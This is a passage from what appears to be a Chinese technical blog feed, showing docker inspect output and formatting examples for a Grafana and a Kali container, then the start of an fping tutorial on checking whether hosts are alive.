class="hljs-string">&quot;Type&quot;</span>: <span class="hljs-string">&quot;json-file&quot;</span>,<br>                <span class="hljs-string">&quot;Config&quot;</span>: &#123;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;NetworkMode&quot;</span>: <span class="hljs-string">&quot;default&quot;</span>,<br>            <span class="hljs-string">&quot;PortBindings&quot;</span>: &#123;&#125;,<br>            <span class="hljs-string">&quot;RestartPolicy&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;no&quot;</span>,<br>                <span class="hljs-string">&quot;MaximumRetryCount&quot;</span>: <span class="hljs-number">0</span><br>            &#125;,<br>            <span class="hljs-string">&quot;AutoRemove&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;VolumeDriver&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;VolumesFrom&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CapAdd&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CapDrop&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CgroupnsMode&quot;</span>: <span class="hljs-string">&quot;host&quot;</span>,<br>            <span class="hljs-string">&quot;Dns&quot;</span>: [],<br>            <span class="hljs-string">&quot;DnsOptions&quot;</span>: [],<br>            <span class="hljs-string">&quot;DnsSearch&quot;</span>: [],<br>            <span class="hljs-string">&quot;ExtraHosts&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;GroupAdd&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;IpcMode&quot;</span>: <span class="hljs-string">&quot;private&quot;</span>,<br>            <span class="hljs-string">&quot;Cgroup&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Links&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;OomScoreAdj&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;PidMode&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Privileged&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;PublishAllPorts&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;ReadonlyRootfs&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;SecurityOpt&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;UTSMode&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;UsernsMode&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;ShmSize&quot;</span>: <span class="hljs-number">67108864</span>,<br>            <span class="hljs-string">&quot;Runtime&quot;</span>: <span class="hljs-string">&quot;runc&quot;</span>,<br>            <span class="hljs-string">&quot;ConsoleSize&quot;</span>: [<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-number">0</span><br>            ],<br>            <span class="hljs-string">&quot;Isolation&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;CpuShares&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;Memory&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;NanoCpus&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CgroupParent&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;BlkioWeight&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;BlkioWeightDevice&quot;</span>: [],<br>            <span class="hljs-string">&quot;BlkioDeviceReadBps&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;BlkioDeviceWriteBps&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;BlkioDeviceReadIOps&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;BlkioDeviceWriteIOps&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CpuPeriod&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpuQuota&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpuRealtimePeriod&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpuRealtimeRuntime&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpusetCpus&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;CpusetMems&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;Devices&quot;</span>: [],<br>            <span class="hljs-string">&quot;DeviceCgroupRules&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;DeviceRequests&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;KernelMemory&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;KernelMemoryTCP&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;MemoryReservation&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;MemorySwap&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;MemorySwappiness&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;OomKillDisable&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;PidsLimit&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Ulimits&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;CpuCount&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;CpuPercent&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;IOMaximumIOps&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;IOMaximumBandwidth&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;MaskedPaths&quot;</span>: [<br>                <span class="hljs-string">&quot;/proc/asound&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/acpi&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/kcore&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/keys&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/latency_stats&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/timer_list&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/timer_stats&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/sched_debug&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/scsi&quot;</span>,<br>                <span class="hljs-string">&quot;/sys/firmware&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;ReadonlyPaths&quot;</span>: [<br>                <span class="hljs-string">&quot;/proc/bus&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/fs&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/irq&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/sys&quot;</span>,<br>                <span class="hljs-string">&quot;/proc/sysrq-trigger&quot;</span><br>            ]<br>        &#125;,<br>        <span class="hljs-string">&quot;GraphDriver&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Data&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;LowerDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/6c2f8aaf6b91b05cad73153ed26167454ccba0b4fdc4eec9d855f6a6eabe5885-init/diff:/var/lib/docker/overlay2/633c4f694e05024bd76ad9fa14e1c6e91eafa6fc167d32d65323885a9716bc35/diff:/var/lib/docker/overlay2/3ecd937d9ada1a8fca42695112f838d4e6eecad76e4da399deacb18ef3649f82/diff:/var/lib/docker/overlay2/034018bf0da3afd6cf8bea09c68058ed00aef54e0874542ab6b0cd0b5a2f5b02/diff:/var/lib/docker/overlay2/6a03f6c5a8ecfae171548b33f90b727a03afd182a426885717725fbd33e1e336/diff:/var/lib/docker/overlay2/e0ab3c204ba426a01ca2074f17047430c05eecc9d07a1e950e1bc0a49bb46181/diff:/var/lib/docker/overlay2/2f13d908a74a801add00f7fff9820ccfb297beac35a2d91ea05f812e2de3faf2/diff:/var/lib/docker/overlay2/5342538fe3dcd1ce2077dc5ac82efaed68d7fa18d7d58e2c41129f1f0c3a0b3f/diff:/var/lib/docker/overlay2/40c7b37364a365de1537dd0a8fbf60f9fc1484feb520fea5a45e396dcbb4e121/diff:/var/lib/docker/overlay2/a02e590a00667b827a1e3c789b75c3bb846586593bf2fc8015546a8351f77443/diff&quot;</span>,<br>                <span class="hljs-string">&quot;MergedDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/6c2f8aaf6b91b05cad73153ed26167454ccba0b4fdc4eec9d855f6a6eabe5885/merged&quot;</span>,<br>                <span class="hljs-string">&quot;UpperDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/6c2f8aaf6b91b05cad73153ed26167454ccba0b4fdc4eec9d855f6a6eabe5885/diff&quot;</span>,<br>                <span class="hljs-string">&quot;WorkDir&quot;</span>: <span class="hljs-string">&quot;/var/lib/docker/overlay2/6c2f8aaf6b91b05cad73153ed26167454ccba0b4fdc4eec9d855f6a6eabe5885/work&quot;</span><br>            &#125;,<br>            <span class="hljs-string">&quot;Name&quot;</span>: <span class="hljs-string">&quot;overlay2&quot;</span><br>        &#125;,<br>        <span class="hljs-string">&quot;Mounts&quot;</span>: [],<br>        <span class="hljs-string">&quot;Config&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Hostname&quot;</span>: <span class="hljs-string">&quot;4b0e2ed242e0&quot;</span>,<br>            <span class="hljs-string">&quot;Domainname&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;User&quot;</span>: <span class="hljs-string">&quot;472&quot;</span>,<br>            <span class="hljs-string">&quot;AttachStdin&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStdout&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;AttachStderr&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;ExposedPorts&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;3000/tcp&quot;</span>: &#123;&#125;<br>            &#125;,<br>            <span class="hljs-string">&quot;Tty&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;OpenStdin&quot;</span>: <span class="hljs-literal">true</span>,<br>            <span class="hljs-string">&quot;StdinOnce&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;Env&quot;</span>: [<br>                <span class="hljs-string">&quot;PATH=/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_CONFIG=/etc/grafana/grafana.ini&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_DATA=/var/lib/grafana&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_HOME=/usr/share/grafana&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_LOGS=/var/log/grafana&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_PLUGINS=/var/lib/grafana/plugins&quot;</span>,<br>                <span class="hljs-string">&quot;GF_PATHS_PROVISIONING=/etc/grafana/provisioning&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;Cmd&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Image&quot;</span>: <span class="hljs-string">&quot;aeeaa96eea83&quot;</span>,<br>            <span class="hljs-string">&quot;Volumes&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;WorkingDir&quot;</span>: <span class="hljs-string">&quot;/usr/share/grafana&quot;</span>,<br>            <span class="hljs-string">&quot;Entrypoint&quot;</span>: [<br>                <span class="hljs-string">&quot;/run.sh&quot;</span><br>            ],<br>            <span class="hljs-string">&quot;OnBuild&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;Labels&quot;</span>: &#123;&#125;<br>        &#125;,<br>        <span class="hljs-string">&quot;NetworkSettings&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;Bridge&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;SandboxID&quot;</span>: <span class="hljs-string">&quot;d5029e992abf128054cd8dcb811ef7fcddde6c94578e84b3ad41b309eeea0301&quot;</span>,<br>            <span class="hljs-string">&quot;HairpinMode&quot;</span>: <span class="hljs-literal">false</span>,<br>            <span class="hljs-string">&quot;LinkLocalIPv6Address&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;LinkLocalIPv6PrefixLen&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;Ports&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;3000/tcp&quot;</span>: <span class="hljs-literal">null</span><br>            &#125;,<br>            <span class="hljs-string">&quot;SandboxKey&quot;</span>: <span class="hljs-string">&quot;/var/run/docker/netns/d5029e992abf&quot;</span>,<br>            <span class="hljs-string">&quot;SecondaryIPAddresses&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;SecondaryIPv6Addresses&quot;</span>: <span class="hljs-literal">null</span>,<br>            <span class="hljs-string">&quot;EndpointID&quot;</span>: <span class="hljs-string">&quot;14e461fe748eea297b8d84f043159905b7956018493b45476442b060ed2e9c3d&quot;</span>,<br>            <span class="hljs-string">&quot;Gateway&quot;</span>: <span class="hljs-string">&quot;172.17.0.1&quot;</span>,<br>            <span class="hljs-string">&quot;GlobalIPv6Address&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;GlobalIPv6PrefixLen&quot;</span>: <span class="hljs-number">0</span>,<br>            <span class="hljs-string">&quot;IPAddress&quot;</span>: <span class="hljs-string">&quot;172.17.0.3&quot;</span>,<br>            <span class="hljs-string">&quot;IPPrefixLen&quot;</span>: <span class="hljs-number">16</span>,<br>            <span class="hljs-string">&quot;IPv6Gateway&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>            <span class="hljs-string">&quot;MacAddress&quot;</span>: <span class="hljs-string">&quot;02:42:ac:11:00:03&quot;</span>,<br>            <span class="hljs-string">&quot;Networks&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;bridge&quot;</span>: &#123;<br>                    <span class="hljs-string">&quot;IPAMConfig&quot;</span>: <span class="hljs-literal">null</span>,<br>                    <span class="hljs-string">&quot;Links&quot;</span>: <span class="hljs-literal">null</span>,<br>                    <span class="hljs-string">&quot;Aliases&quot;</span>: <span class="hljs-literal">null</span>,<br>                    <span class="hljs-string">&quot;NetworkID&quot;</span>: <span class="hljs-string">&quot;3934b22c38426e6823be8668550b7d3992929a89bd449089673db6dc3dbbef26&quot;</span>,<br>                    <span class="hljs-string">&quot;EndpointID&quot;</span>: <span class="hljs-string">&quot;14e461fe748eea297b8d84f043159905b7956018493b45476442b060ed2e9c3d&quot;</span>,<br>                    <span class="hljs-string">&quot;Gateway&quot;</span>: <span class="hljs-string">&quot;172.17.0.1&quot;</span>,<br>                    <span class="hljs-string">&quot;IPAddress&quot;</span>: <span class="hljs-string">&quot;172.17.0.3&quot;</span>,<br>                    <span class="hljs-string">&quot;IPPrefixLen&quot;</span>: <span class="hljs-number">16</span>,<br>                    <span class="hljs-string">&quot;IPv6Gateway&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>                    <span class="hljs-string">&quot;GlobalIPv6Address&quot;</span>: <span class="hljs-string">&quot;&quot;</span>,<br>                    <span class="hljs-string">&quot;GlobalIPv6PrefixLen&quot;</span>: <span class="hljs-number">0</span>,<br>                    <span class="hljs-string">&quot;MacAddress&quot;</span>: <span class="hljs-string">&quot;02:42:ac:11:00:03&quot;</span>,<br>                    <span class="hljs-string">&quot;DriverOpts&quot;</span>: <span class="hljs-literal">null</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>]<br></code></pre></td></tr></table></figure><h4 id="OPTIONS-9"><a href="#OPTIONS-9" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="f-2"><a href="#f-2" class="headerlink" title="-f"></a>-f</h5><p>指定返回值的模版文件，类似 docker inspect –format</p><h4 id="实例-10"><a href="#实例-10" class="headerlink" title="实例"></a>实例</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  /tmp docker ps <br>CONTAINER ID   IMAGE                           COMMAND   CREATED         STATUS         PORTS     NAMES<br>61804e0083af   kalilinux/kali-rolling:latest   <span class="hljs-string">&quot;bash&quot;</span>    14 months ago   Up 3 seconds             kali<br></code></pre></td></tr></table></figure><h5 id="查看容器ID"><a href="#查看容器ID" class="headerlink" title="查看容器ID"></a>查看容器ID</h5><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">docker inspect -f=&#x27;&#123;&#123;.Id&#125;&#x27; Name<span class="hljs-string">|Id</span><br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">➜  /tmp docker inspect -f=&#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Id</span>&#125;&#125;</span><span class="language-xml">&#x27; 61804e0083af</span><br><span class="language-xml">61804e0083afedef03947dc1189d5c4ecfc8f689885f8dffcac4dc4624caa00f</span><br></code></pre></td></tr></table></figure><h5 id="查看容器创建具体时间"><a href="#查看容器创建具体时间" class="headerlink" title="查看容器创建具体时间"></a>查看容器创建具体时间</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Created</span>&#125;&#125;</span><span class="language-xml">&#x27; Name|Id</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  /tmp docker ps <br>CONTAINER ID   IMAGE                           COMMAND   CREATED         STATUS         PORTS     NAMES<br>61804e0083af   kalilinux/kali-rolling:latest   <span class="hljs-string">&quot;bash&quot;</span>    14 months ago   Up 3 seconds             kali<br></code></pre></td></tr></table></figure><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">➜  /tmp docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Created</span>&#125;&#125;</span><span class="language-xml">&#x27; 61804e0083af</span><br><span class="language-xml">2022-12-08T04:42:46.58388013Z</span><br></code></pre></td></tr></table></figure><h5 id="查看容器日志路径"><a href="#查看容器日志路径" class="headerlink" title="查看容器日志路径"></a>查看容器日志路径</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.LogPath</span>&#125;&#125;</span><span class="language-xml">&#x27; Name|Id</span><br></code></pre></td></tr></table></figure><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">➜  /tmp docker <span class="hljs-keyword">inspect</span> -f <span class="hljs-string">&#x27;&#123;&#123;.LogPath&#125;&#125;&#x27;</span> <span class="hljs-number">61804</span>e0083af<br><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/docker/</span>containers<span class="hljs-regexp">/61804e0083afedef03947dc1189d5c4ecfc8f689885f8dffcac4dc4624caa00f/</span><span class="hljs-number">61804</span>e0083afedef03947dc1189d5c4ecfc8f689885f8dffcac4dc4624caa00f-json.log<br></code></pre></td></tr></table></figure><h5 id="查看容器所使用镜像"><a href="#查看容器所使用镜像" class="headerlink" title="查看容器所使用镜像"></a>查看容器所使用镜像</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f &#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Image</span>&#125;&#125;</span><span class="language-xml">&#x27; Name|Id</span><br></code></pre></td></tr></table></figure><p>查询结果为镜像id，docker images 查询的id为镜像id的前12位</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">➜  ~ docker inspect -f &#x27;&#123;&#123;.Image&#125;&#125;&#x27; <span class="hljs-number">61804e0083</span>af<br>sha<span class="hljs-number">256</span>:<span class="hljs-number">0</span>d<span class="hljs-number">323592</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>f<span class="hljs-number">57780</span>d<span class="hljs-number">4</span>caa<span class="hljs-number">99</span>ba<span class="hljs-number">48e8867</span>d<span class="hljs-number">43532</span><span class="hljs-keyword">c</span><span class="hljs-number">72879</span>b<span class="hljs-number">31</span>ec<span class="hljs-number">0</span>b<span class="hljs-number">47</span>af<span class="hljs-number">0</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>cfeb<span class="hljs-number">19</span><br>➜  ~ docker images | grep <span class="hljs-number">0</span>d<span class="hljs-number">3235</span><br>kalilinux/kali-rolling    latest       <span class="hljs-number">0</span>d<span class="hljs-number">323592</span><span class="hljs-keyword">c</span><span class="hljs-number">7</span>f<span class="hljs-number">5</span>   <span class="hljs-number">14</span> months ago   <span class="hljs-number">140</span>MB<br></code></pre></td></tr></table></figure><h5 id="查看容器名"><a href="#查看容器名" class="headerlink" title="查看容器名"></a>查看容器名</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f=&#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.Name</span>&#125;&#125;</span><span class="language-xml">&#x27; 61804e0083af</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  /tmp docker inspect -f=<span class="hljs-string">&#x27;&#123;&#123;.Name&#125;&#125;&#x27;</span> 61804e0083af<br>/kali<br>➜  /tmp docker ps | grep 61804e0083af<br>61804e0083af   kalilinux/kali-rolling:latest   <span class="hljs-string">&quot;bash&quot;</span>                   15 months ago   Up 7 minutes                                        kali<br>➜  /tmp <br><br></code></pre></td></tr></table></figure><h5 id="查看容器内IP"><a href="#查看容器内IP" class="headerlink" title="查看容器内IP"></a>查看容器内IP</h5><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">docker inspect -f=&#x27;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">.NetworkSettings.Networks.bridge.IPAddress</span>&#125;&#125;</span><span class="language-xml">&#x27; 61804e0083af</span><br></code></pre></td></tr></table></figure><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">➜  /tmp docker inspect -f=&#x27;&#123;&#123;.NetworkSettings.Networks.bridge.IPAddress&#125;&#125;&#x27; 61804e0083af<br><span class="hljs-number">172.17.0.2</span><br></code></pre></td></tr></table></figure><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs tap">➜  /tmp docker exec -it 61804e0083af &quot;ifconfig&quot;<br>eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500<br>        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255<br>        ether 02:42:ac:11:00:02  txqueuelen<span class="hljs-number"> 0 </span> (Ethernet)<br>        RX packets<span class="hljs-number"> 15 </span> bytes<span class="hljs-number"> 1322 </span>(1.2 KiB)<br>        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0<br>        TX packets<span class="hljs-number"> 0 </span> bytes<span class="hljs-number"> 0 </span>(0.0 B)<br>        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0<br><br>lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536<br>        inet 127.0.0.1  netmask 255.0.0.0<br>        loop  txqueuelen<span class="hljs-number"> 1000 </span> (Local Loopback)<br>        RX packets<span class="hljs-number"> 0 </span> bytes<span class="hljs-number"> 0 </span>(0.0 B)<br>        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0<br>        TX packets<span class="hljs-number"> 0 </span> bytes<span class="hljs-number"> 0 </span>(0.0 B)<br>        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/02/19/security/secvulns/oss/osstools/"/>
    <url>/2024/02/19/security/secvulns/oss/osstools/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>fping</title>
    <link href="/2024/02/19/security/sectools/fping/"/>
    <url>/2024/02/19/security/sectools/fping/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>日常工作过程中，需要批量探测部分IP是否存活</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>send ICMP ECHO_REQUEST packets to network hosts</p><p>通过发送 ICMP 数据包进行探测存活</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="MacOS"><a href="#MacOS" class="headerlink" title="MacOS"></a>MacOS</h2><p>brew install fping </p><h2 id="RedHat"><a href="#RedHat" class="headerlink" title="RedHat"></a>RedHat</h2><p>yum install fping </p><p>dnf install fping</p><h2 id="Ubuntu"><a href="#Ubuntu" class="headerlink" title="Ubuntu"></a>Ubuntu</h2><p>apt install fping</p><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><p>fping 选项 语法</p><h2 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h2><h3 id="a"><a href="#a" class="headerlink" title="-a"></a>-a</h3><p>显示活动主机列表</p><h3 id="u"><a href="#u" class="headerlink" title="-u"></a>-u</h3><p>显示不可达主机列表</p><h3 id="g"><a href="#g" class="headerlink" title="-g"></a>-g</h3><p>制定CIDR地址或者IP地址范围</p><h3 id="f"><a href="#f" class="headerlink" title="-f"></a>-f</h3><p>从文件中读取要扫描的IP地址列表</p><h3 id="t"><a href="#t" class="headerlink" title="-t"></a>-t</h3><p>设置超时时间（等待响应的最大时间），默认 500ms</p><h3 id="r"><a href="#r" class="headerlink" title="-r"></a>-r</h3><p>设置重试次数，默认 3 次</p><h3 id="s"><a href="#s" class="headerlink" title="-s"></a>-s</h3><p>启用统计信息</p><h3 id="q"><a href="#q" class="headerlink" title="-q"></a>-q</h3><p>只显示有响应的IP地址，不显示错误信息</p><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><h2 id="探测单个IP地址存活性"><a href="#探测单个IP地址存活性" class="headerlink" title="探测单个IP地址存活性"></a>探测单个IP地址存活性</h2><p>fping 10.191.5.21</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">➜  /tmp fping <span class="hljs-number">10</span>.<span class="hljs-number">191</span>.<span class="hljs-number">5</span>.<span class="hljs-number">21</span><br><span class="hljs-number">10.191.5.21</span> is unreachable<br></code></pre></td></tr></table></figure><h2 id="探测文件列表中IP地址存活性"><a href="#探测文件列表中IP地址存活性" class="headerlink" title="探测文件列表中IP地址存活性"></a>探测文件列表中IP地址存活性</h2><p>fping -f iplist.txt</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 